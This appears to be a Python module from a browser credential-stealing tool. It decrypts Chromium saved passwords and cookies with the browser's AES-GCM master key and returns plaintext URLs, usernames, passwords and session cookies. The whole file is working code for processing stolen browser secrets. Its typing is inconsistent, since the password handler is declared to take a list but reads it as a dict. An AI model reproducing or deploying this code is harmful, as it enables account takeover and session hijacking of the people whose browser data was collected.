from Cryptodome.Cipher import AES

_CHROMIUM_PRODUCT = {
    "Passwords": [],
    "Cookies": []
}


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(chromium_master_key, iv):
    return AES.new(chromium_master_key, AES.MODE_GCM, iv)


def decrypt_cipher(encrypted_password, chromium_master_key):
    try:
        encrypted_password = bytes.fromhex(encrypted_password)
        chromium_master_key = bytes.fromhex(chromium_master_key)
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = generate_cipher(chromium_master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except:
        return "Unknown"


def handle_chromium_passwords(creds_arr: list, chromium_master_key: str) -> list:
    chromium_passwords = []
    for num in creds_arr:
        creds_json = creds_arr.get(num)
        enc_password = creds_json.get('password')
        plaint_text_pass = decrypt_cipher(enc_password, chromium_master_key)
        plaint_text_pass and chromium_passwords.append(
            {"url": creds_json.get('url'), "username": creds_json.get('username'), "passwords": plaint_text_pass})
    return chromium_passwords


def handle_chromium_cookies(cookies_arr: list, chromium_master_key: str) -> list:
    chromium_cookies = []
    for cookie_obj in cookies_arr:
        cookie_domain = cookie_obj.get("Domain")
        enc_cookie = cookie_obj.get("Value")
        plaint_text_cookie = decrypt_cipher(enc_cookie, chromium_master_key=chromium_master_key)
        chromium_cookies.append({"domain": cookie_domain, "cookie": plaint_text_cookie})
    return chromium_cookies


def handle_all_chromium_modules(results: dict, type: str) -> dict:
    chromium_product = _CHROMIUM_PRODUCT
    chromium_results = results.get(type)
    chromium_passwords = chromium_results.get("Passwords")
    chromium_master_key = chromium_results.get(f"{type}-Masterkey")
    chromium_product["Passwords"] = handle_chromium_passwords(chromium_passwords, chromium_master_key)
    chromium_cookies = chromium_results.get("Cookies")
    chromium_product["Cookies"] = handle_chromium_cookies(chromium_cookies, chromium_master_key)
    return chromium_product
